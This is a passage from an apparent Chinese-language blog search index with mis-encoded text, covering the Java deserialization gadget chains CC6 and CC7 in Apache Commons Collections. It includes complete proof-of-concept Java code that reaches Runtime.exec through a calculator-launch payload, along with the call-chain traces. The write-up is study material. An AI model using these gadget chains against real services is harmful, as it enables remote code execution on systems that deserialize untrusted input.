è€Œè¿™é‡Œçš„å€¼ä¸ºfalseï¼š\nä¹Ÿå°±æ˜¯map.containsKey(key)ä¸ºtrueï¼Œä¹Ÿå°±æ˜¯è¯´mapé‡Œé¢å·²ç»å­˜åœ¨ä¸€ä¸ªkeyä¸ºYuy0ungçš„å¯¹è±¡äº†ï¼Œè€Œæˆ‘è‡ªå·±å¹¶æ²¡æœ‰putè¿™ç©æ„ï¼Œè¯´æ˜ä¸€å®šæ˜¯å‰é¢çš„ä»£ç è°ƒç”¨æœ‰è¿™ä¸ªæ“ä½œï¼Œè¿™é‡Œå…¶å®æ˜¯evilMap.put(tme,\u0026quot;Yuy1ung\u0026quot;);çš„åŸå› ï¼Œæˆ‘ä»¬æ‰“å°è¿™ä¸€æ­¥å‰åçš„mapå³å¯çœ‹å‡ºæ¥ï¼š\né‚£ä¹ˆæˆ‘ä»¬åœ¨åºåˆ—åŒ–å‰å°†è¿™ä¸ªæ–°å¢çš„keyç§»é™¤å³å¯ï¼š\nouterMap.remove(\u0026#34;Yuy0ung\u0026#34;); å€¼å¾—ä¸€é¢˜çš„æ˜¯ï¼Œæˆ‘åœ¨ä¸€å¼€å§‹å¹¶æ²¡æœ‰ä½¿ç”¨fakeTransformersè¿™ä¸ªæ–¹æ³•ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨æ„é€ å¥½çš„transformersï¼Œè¿™ç§æ–¹æ³•åœ¨è¿è¡Œåˆ°evilMap.put(tme,\u0026quot;Yuy1ung\u0026quot;);å°±å·²ç»ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œäº†ï¼Œè°ƒè¯•ä¸€ä¸‹å°±å¯ä»¥å‘ç°hashMapçš„putæ–¹æ³•åŒæ ·è°ƒç”¨äº†hash(key)ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åé¢çš„è°ƒç”¨é“¾è§¦å‘ï¼Œä»è€Œå‘½ä»¤æ‰§è¡Œï¼š\nè‡³æ­¤æˆ‘ä»¬å¾—åˆ°äº†å®Œæ•´çš„pocï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections2 { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerMap.remove(\u0026#34;Yuy0ung\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(evilMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } å°è¯•è¿è¡Œï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œè§¦å‘è®¡ç®—å™¨ï¼š\næ€»ç»“ å†çœ‹ä¸€çœ¼å®Œæ•´è°ƒç”¨é“¾ï¼š\njava.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() è¿™ä¸ªåˆ©â½¤é“¾å¯ä»¥åœ¨Java 7å’Œ8çš„â¾¼ç‰ˆæœ¬è§¦å‘ï¼Œæ²¡æœ‰ç‰ˆæœ¬é™åˆ¶\n",
        "summary": "javaååºåˆ—åŒ–-CC6 å­¦ä¹ ç¬¬äºŒæ¡CommonsCollectionsçš„åˆ©ç”¨é“¾\nTiedMapEntry å‰é¢å·²ç»å­¦ä¹ äº†CC1ï¼Œä½†æ˜¯åœ¨Java 8u71ä»¥åCC1å°±å¤±æ•ˆäº†ï¼Œå› ä¸ºsun.reflect.annotation.AnnotationInvocationHandler#readObjectçš„é€»è¾‘å˜åŒ–äº†\nè€ŒCC6ï¼Œå°±ç®—æ˜¯è§£å†³äº†é«˜ç‰ˆæœ¬javaçš„åˆ©ç”¨é—®é¢˜ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªpç¥ç®€åŒ–ç‰ˆåˆ©ç”¨é“¾ï¼š\nGadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() å¯ä»¥çœ‹åˆ°åœ¨LazyMapåˆ°execçš„åˆ©ç”¨é“¾æ˜¯æ²¡å˜çš„ï¼Œæ”¹å˜çš„ä¸»è¦æ˜¯è§¦å‘LazyMap#get()çš„æ–¹å¼ï¼Œæ¥æ›¿ä»£åŸæœ¬CC1ä¸­çš„AnnotationInvocationHandler\nè€Œè¿™é‡Œç»™å‡ºçš„ç±»æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œä»–çš„getValueæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š è€Œä»–çš„hashCodeæ–¹æ³•å°±è°ƒç”¨äº†getValueï¼š\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°èƒ½å¤Ÿè°ƒç”¨è¿™ä¸ªhashCodeçš„åœ°æ–¹ï¼Œåœ¨ysoserialä¸­ï¼Œæ˜¯åˆ©â½¤ java.util.HashSet#readObject åˆ° HashMap#put() åˆ° HashMap#hash(key)æœ€ååˆ° TiedMapEntry#hashCode()\nè€Œpç‰›åœ¨ java.util.HashMap#readObject ä¸­æ‰¾åˆ° HashMap#hash()çš„è°ƒâ½¤ï¼š è€Œè¿™é‡Œçš„hash(key)å°±è°ƒç”¨äº†key.hashCode()ï¼š\næ³¨æ„åˆ°è¿™é‡Œçš„å‚æ•°keyï¼Œåªè¦æˆ‘ä»¬è®©keyçš„å€¼ä¸ºTiedMapEntryçš„å¯¹è±¡ï¼Œé‚£ä¹ˆæœ€åè°ƒç”¨çš„å°±æ˜¯TiedMapEntry#hashCode()ï¼Œå¦‚æ­¤å°±å»æ‰äº†ysoserialæœ€å‰â¾¯çš„ä¸¤æ¬¡è°ƒâ½¤ï¼Œä¹Ÿèƒ½æ„é€ ä¸ºå®Œæ•´gadget\næ„é€  é¦–å…ˆæ˜¯LazyMapåçš„éƒ¨åˆ†ä¸å˜ï¼Œè¿™é‡Œä¸ºäº†é˜²æ­¢åœ¨æœ¬åœ°è°ƒè¯•æ—¶å°±è§¦å‘å‘½ä»¤æ‰§è¡Œå½±å“è°ƒè¯•ï¼Œæ‰€ä»¥å…ˆè®¾ç½®äº†ä¸€ä¸ªfakeTransformersï¼Œç­‰åˆ°åºåˆ—åŒ–æ—¶å†åå°„æ›´æ”¹ï¼š\nTransformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); æ¥ä¸‹æ¥æŒ‰ç…§TiedMapEntryçš„æ„é€ å‡½æ•°æ ¼å¼æ¥åˆ›å»ºå¯¹è±¡ï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC7",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc7/",
        "content": "Javaååºåˆ—åŒ–-CC7 cc7çš„æ€è·¯åŒæ ·æ˜¯æ‰¾äº†å¦ä¸€æ¡è°ƒç”¨é“¾æ¥è§¦å‘Lazy.getæ–¹æ³•\nHashTable() Hashtable ä¸ HashMapå¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¸€ç§key-valueå½¢å¼çš„å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰åŒºåˆ«ï¼š\nHashMap ä¸ Hashtableçš„çˆ¶ç±»ä¸ä¸€æ ·ã€‚ ä¸¤è€…å†…éƒ¨åŸºæœ¬éƒ½æ˜¯ä½¿ç”¨â€œæ•°ç»„-é“¾è¡¨â€çš„ç»“æ„ï¼Œä½†æ˜¯ HashMap å¼•å…¥äº†çº¢é»‘æ ‘çš„å®ç°ã€‚ Hashtable çš„key-value ä¸å…è®¸ä¸ºnullå€¼ï¼Œä½†æ˜¯HashMap æ˜¯å…è®¸çš„ï¼Œåè€…ä¼šå°† key=valueçš„å®ä½“æ”¾åœ¨index=0 çš„ä½ç½®ã€‚ Hashtable çº¿ç¨‹å®‰å…¨ï¼ŒHashMap çº¿ç¨‹ä¸å®‰å…¨ã€‚ åŒæ ·çš„ï¼Œæ—¢ç„¶HashMapå¯ä»¥å®ç°ååºåˆ—åŒ–æ¼æ´ï¼ŒHashtableåŒæ ·å¯ä»¥ã€‚\nåˆ†ææºç ï¼Œè¿™ä¸ªHashtableç±»å¯ä»¥ç»™å‡ºä¸¤æ¡é“¾ï¼Œåˆ†åˆ«æ˜¯\nreadObject()ä¸­çš„reconstitution()çš„hashCode()æ–¹æ³• readObject()ä¸­çš„reconstitution()çš„equals()æ–¹æ³• hashCodeé“¾ å…ˆçœ‹ä¸€ä¸‹Hashtableçš„readObject()æ–¹æ³•ï¼š\næœ€åçš„å¾ªç¯é‡Œä½¿ç”¨äº†reconstitutionPutæ–¹æ³•ï¼Œå°†ååºåˆ—åŒ–å¾—åˆ°çš„key-value æ”¾åœ¨å†…éƒ¨å®ç°çš„ Entry æ•°ç»„ tableé‡Œ\nå†çœ‹çœ‹è¿™ä¸ªreconstitutionPutæ–¹æ³•ï¼š\nè¿™é‡Œè°ƒç”¨äº†key.hashCodeï¼ŒkeyåŒæ ·æ˜¯æˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆæ€è·¯å°±å’ŒCC6ä¸€æ ·äº†ï¼Œåªä¸è¿‡æ˜¯æŠŠHashMapæ¢æˆäº†HashTableï¼Œæ„é€ ä¸€ä¸‹ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7_HashTable { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Hashtable innerTable = new Hashtable(); // Map innerMap = new HashMap(); Map outerTable = LazyMap.decorate(innerTable, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerTable, \u0026#34;Yuy0ung\u0026#34;); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerTable.remove(\u0026#34;Yuy0ung\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(evilMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸè§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\nequalsé“¾ ä¸Šé¢çš„é“¾å­åªèƒ½è¯´æ˜¯CC6çš„ä¿®æ”¹é“¾ï¼Œè¿™ä¸ªequalsé“¾æ‰æ˜¯ysoserialä¸Šé¢çš„é“¾å­\né€»è¾‘æ¢³ç† åŒæ ·æ˜¯ä»Hashtableçš„readObject()æ–¹æ³•å…¥æ‰‹ï¼Œè¿›å…¥åˆ°reconstitutionPutæ–¹æ³•ï¼š\næ³¨æ„è¿™é‡Œçš„equalsæ–¹æ³•ï¼Œè¿›å…¥forè¯­å¥ï¼Œç„¶åå°±æ˜¯ä¸ªifåˆ¤æ–­è¯­å¥äº†ï¼Œæ‰§è¡Œäº†e.hashå’Œe.key.equals(key)ï¼Œä¸è¿‡Javaè¯­è¨€è¿˜å­˜åœ¨ä¸€ä¸ªå¸ƒå°”çŸ­è·¯è¿è¾“çš„ç‰¹æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´å½“e.hash == hashåˆ¤å®šä¸ºå‡ï¼Œå°±ä¼šç›´æ¥é€€å‡ºifè¯­å¥ï¼Œå¯¼è‡´ä¸æ‰§è¡Œe.key.equals(key)ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—è®©e.hash == hashä¸ºçœŸ\næˆ‘ä»¬åˆ†æä¸Šé¢çš„ä»£ç å¯çŸ¥ï¼Œè¿™é‡Œå¤§æ¦‚æ„æ€å°±æ˜¯å…ˆè®¡ç®—å‡ºkeyçš„hashå€¼ï¼Œç„¶åæ ¹æ®hashå€¼è®¡ç®—å­˜å‚¨ç´¢å¼•indexï¼Œå†é€šè¿‡forå¾ªç¯å¾—åˆ°e.nextä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªmapé”®å€¼å¯¹ï¼Œæœ€åè¿›å…¥ifåˆ¤æ–­æ¯”è¾ƒä¸¤è€…hashå€¼æ˜¯å¦ç›¸åŒï¼Œä¸åŒå°±æŠŠè¿™ä¸ªé”®å€¼å¯¹åŠ å…¥åˆ°tabä¸­ã€‚å½“ç„¶æˆ‘ä»¬æƒ³è¦çš„æ˜¯ä¸¤ä¸ªé”®å€¼å¯¹çš„keyçš„hashç›¸åŒã€‚è¿™é‡Œæ˜¯å¾ªç¯æ·»åŠ é”®å€¼å¯¹åˆ°tabä¸­ï¼Œå¾ˆæ˜¾ç„¶å½“åªæœ‰ä¸€ä¸ªé”®å€¼å¯¹çš„æ—¶å€™ï¼Œhashè‚¯å®šä¸ç›¸åŒï¼Œæˆ‘ä»¬éœ€è¦è‡³å°‘ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œå½“ç¬¬ä¸€ä¸ªé”®å€¼å¯¹æ·»åŠ åï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸€ä¸ªè¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥è¦æ‰§è¡Œä¸¤æ¬¡putè¯­å¥ åˆ°è¿™é‡Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³ï¼šæ˜¯ä¸æ˜¯ç›´æ¥æŠŠä¸¤ä¸ªé”®å€¼å¯¹çš„keyå€¼æ”¹ä¸ºä¸€æ ·å°±è¡Œäº†ï¼Œå›åˆ°readObjectä¸­ï¼š\nçœ‹åˆ°æœ€ä¸‹é¢è¿˜åŸtableæ•°ç»„æ—¶æ˜¯æ ¹æ®elementsæ¥åˆ¤æ–­çš„ï¼Œè€Œå¦‚æœkeyç›¸åŒæ—¶ element è®¡ç®—ä¼šæŠŠä¸¤ä¸ª map è®¡ç®—ä¸ºåªæœ‰ä¸€ä¸ª mapï¼Œé‚£ä¹ˆæ­¤æ—¶å°±éœ€è¦ç”¨åˆ°å“ˆå¸Œç¢°æ’\nç»§ç»­å¾€ä¸‹ï¼Œå¦‚æœä¸Šé¢çš„æ¡ä»¶éƒ½æ»¡è¶³äº†ï¼Œå°±ä¼šè¿›å…¥e.key.equalsæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šå°†e.keyè®¾ç½®ä¸ºLazyMapå¯¹è±¡ï¼Œä½†å®ƒæ²¡æœ‰equalsæ–¹æ³•ï¼Œäºæ˜¯å‘å…¶çˆ¶ç±»å¯»æ‰¾ï¼Œè°ƒç”¨åˆ°AbstractMapDecoratorç±»çš„equalsæ–¹æ³•ï¼š\næ­¤å¤„ä¼šè°ƒç”¨map.equals()ï¼ŒæŒ‰ç…§æˆ‘ä»¬å…ˆå‰pocçš„é€»è¾‘ï¼Œä¸ºäº†è®©LazyMapè§¦å‘transformæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šç”¨LazyMapæ¥åŒ…è£…ï¼š\nLazyMap.decorate(map,chainedTransformer); è€Œè¿™é‡Œçš„mapå°±æ˜¯HashMapï¼ŒHashMapä¸­åŒæ ·æ²¡æœ‰equalsæ–¹æ³•ï¼Œæ‰€ä»¥å‘ä¸Šè°ƒç”¨åˆ°AbstractMap#equalsï¼š æ³¨æ„åˆ°è¿™é‡Œçš„value.equals(m.get(key)ï¼Œå½“valueä¸ä¸ºnullå³å¯è¿›å…¥è¿™ä¸€æ­¥ï¼Œè€Œå¦‚æœæˆ‘ä»¬å°†mè®¾ç½®ä¸ºLazyMapå¯¹è±¡ï¼Œæ•´æ¡é“¾å­å°±æ‰“é€šäº†ï¼Œæº¯æºè¿™ä¸ªmï¼Œå‘ç°è¦è®¾ç½®keyä¸ºLazyMapå¯¹è±¡ï¼š\nä¹Ÿå°±æ˜¯è¯´e.keyå’Œkeyéƒ½è¦ä¸ºLazyMapå¯¹è±¡ï¼Œå¹¶ä¸”key.hashcodeè¦ç›¸åŒï¼Œä½†ä¸Šé¢æåˆ°äº†ä¸¤ä¸ªé”®å€¼å¯¹çš„keyä¸èƒ½ç›¸åŒï¼Œè€Œè¿™é‡Œkey.hashcodeåˆæ˜¯æ€ä¹ˆè®¡ç®—çš„å‘¢ï¼Ÿåé¢è°ƒè¯•ä¼šå‘ç°key.hashcodeä¼ å…¥çš„æ˜¯æ•°ç»„çš„è¯ï¼Œæœ€åçš„hashå€¼æ˜¯keyçš„hashå€¼å¼‚æˆ–valueçš„hashå€¼\né‚£ä¹ˆæ‰€ä»¥è¿˜æ˜¯åªç”¨è®©ä¸ºLazyMapå¯¹è±¡ä¸­mapé”®å€¼å¯¹çš„keyä¸åŒè€Œå…¶hashå€¼ç›¸åŒå°±è¡Œäº†ï¼Œvalueå°±è®¾ä¸ºä¸€æ ·çš„å°±è¡Œï¼ˆå› ä¸ºä¹Ÿè¦ä¿è¯å…¶hashå€¼ä¸€æ ·ï¼Œè¯´ç™½äº†å°±å“ˆå¸Œç¢°æ’ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¼€å§‹æ„é€ \næ„é€  å›é¡¾ä¸Šé¢åˆ†æçš„æ­¥éª¤ï¼š\néœ€è¦ç”¨putç¼–å†™è¿›ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œé”®éƒ½ä¸ºLazyMapå¯¹è±¡ï¼Œä»¥ä¿è¯keyå®å‚ä¸ºLazyMapå¯¹è±¡ï¼Œe.keyä¹Ÿä¸ºLazyMapå¯¹è±¡\nç”±äºJavaå¸ƒå°”å€¼çŸ­è·¯ç‰¹æ€§ï¼Œè¿˜éœ€è§£å†³hashç›¸ç­‰é—®é¢˜ï¼Œä»è€Œæ‰§è¡Œequalsæ–¹æ³•\nå“ˆå¸Œç¢°æ’å¯ä»¥ä½¿ç”¨yyå’ŒzZæ¥ç»•è¿‡ï¼š\nMap innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map outerMap1 = LazyMap.decorate(innerMap1, transformerChain); outerMap1.put(\u0026#34;yy\u0026#34;, 1); Map outerMap2 = LazyMap.decorate(innerMap2, transformerChain); outerMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable table = new Hashtable(); table.put(outerMap1, 1); table.put(outerMap2, 2); å€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘çš„fakeTransformerså†™æ³•å¦‚ä¸‹ï¼š\nTransformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; è€ŒouterMapä¸¤æ¬¡putåéƒ½è¿”å›1ï¼Œå½“innerMapä¸­çš„é”®çš„hashCodeç›¸åŒæ—¶ï¼ŒHashtable.readObjectä¼šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸€æ ·çš„å¯¹è±¡ï¼Œåªæ‰§è¡Œåœ¨readObjectçš„ä¸€æ¬¡å¾ªç¯ï¼Œå¯¼è‡´åªæ‰§è¡Œä¸€æ¬¡reconstitutionPutæ–¹æ³•\næ‰€ä»¥éœ€è¦ä¿®æ”¹fakeTransformersï¼Œå°†å…¶ç½®ç©ºï¼š\nTransformer[] faketransformers = new Transformer[] {}; å¦å¤–ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡outerMap.putï¼Œéƒ½ä¼šè§¦å‘ä¸€æ¬¡Lazy.getæ–¹æ³•ï¼Œè¿›å…¥ifåä¼šå‘å½“å‰mapä¸­æ·»åŠ é”®å€¼å¯¹ï¼š\nè¿™ä¼šå¯¼è‡´outerMap2ä¼šæœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œå¤šå‡ºä¸€ä¸ªkeyä¸ºyyçš„é”®å€¼å¯¹ï¼Œé—®é¢˜å‡ºåœ¨AbstractMapçš„equalsæ–¹æ³•ï¼š\næ­¤å¤„çš„é•¿åº¦åˆ¤æ–­éœ€è¦é•¿åº¦åˆ¤æ–­éœ€è¦m.size()ä¸º1ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦removeä¸€ä¸ªå…ƒç´ ï¼š\nouterMap2.remove(\u0026#34;yy\u0026#34;); æ‰€ä»¥æœ€ç»ˆä»£ç ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.AbstractMapDecorator; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.AbstractMap; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7_HashTable { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), new ConstantTransformer(1) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map outerMap1 = LazyMap.decorate(innerMap1, transformerChain); outerMap1.put(\u0026#34;yy\u0026#34;, 1); Map outerMap2 = LazyMap.decorate(innerMap2, transformerChain); outerMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable table = new Hashtable(); table.put(outerMap1, 1); table.put(outerMap2, 2); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); outerMap2.remove(\u0026#34;yy\u0026#34;); serialize(table); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\n",
        "summary": "Javaååºåˆ—åŒ–-CC7 cc7çš„æ€è·¯åŒæ ·æ˜¯æ‰¾äº†å¦ä¸€æ¡è°ƒç”¨é“¾æ¥è§¦å‘Lazy.getæ–¹æ³•\nHashTable() Hashtable ä¸ HashMapå¾ˆç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¸€ç§key-valueå½¢å¼çš„å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰åŒºåˆ«ï¼š\nHashMap ä¸ Hashtableçš„çˆ¶ç±»ä¸ä¸€æ ·ã€‚ ä¸¤è€…å†…éƒ¨åŸºæœ¬éƒ½æ˜¯ä½¿ç”¨â€œæ•°ç»„-é“¾è¡¨â€çš„ç»“æ„ï¼Œä½†æ˜¯ HashMap å¼•å…¥äº†çº¢é»‘æ ‘çš„å®ç°ã€‚ Hashtable çš„key-value ä¸å…è®¸ä¸ºnullå€¼ï¼Œä½†æ˜¯HashMap æ˜¯å…è®¸çš„ï¼Œåè€…ä¼šå°† key=valueçš„å®ä½“æ”¾åœ¨index=0 çš„ä½ç½®ã€‚ Hashtable çº¿ç¨‹å®‰å…¨ï¼ŒHashMap çº¿ç¨‹ä¸å®‰å…¨ã€‚ åŒæ ·çš„ï¼Œæ—¢ç„¶HashMapå¯ä»¥å®ç°ååºåˆ—åŒ–æ¼æ´ï¼ŒHashtableåŒæ ·å¯ä»¥ã€‚\nåˆ†ææºç ï¼Œè¿™ä¸ªHashtableç±»å¯ä»¥ç»™å‡ºä¸¤æ¡é“¾ï¼Œåˆ†åˆ«æ˜¯\nreadObject()ä¸­çš„reconstitution()çš„hashCode()æ–¹æ³• readObject()ä¸­çš„reconstitution()çš„equals()æ–¹æ³• hashCodeé“¾ å…ˆçœ‹ä¸€ä¸‹Hashtableçš„readObject()æ–¹æ³•ï¼š\næœ€åçš„å¾ªç¯é‡Œä½¿ç”¨äº†reconstitutionPutæ–¹æ³•ï¼Œå°†ååºåˆ—åŒ–å¾—åˆ°çš„key-value æ”¾åœ¨å†…éƒ¨å®ç°çš„ Entry æ•°ç»„ tableé‡Œ\nå†çœ‹çœ‹è¿™ä¸ªreconstitutionPutæ–¹æ³•ï¼š\nè¿™é‡Œè°ƒç”¨äº†key.hashCodeï¼ŒkeyåŒæ ·æ˜¯æˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆæ€è·¯å°±å’ŒCC6ä¸€æ ·äº†ï¼Œåªä¸è¿‡æ˜¯æŠŠHashMapæ¢æˆäº†HashTableï¼Œæ„é€ ä¸€ä¸‹ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7_HashTable { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new 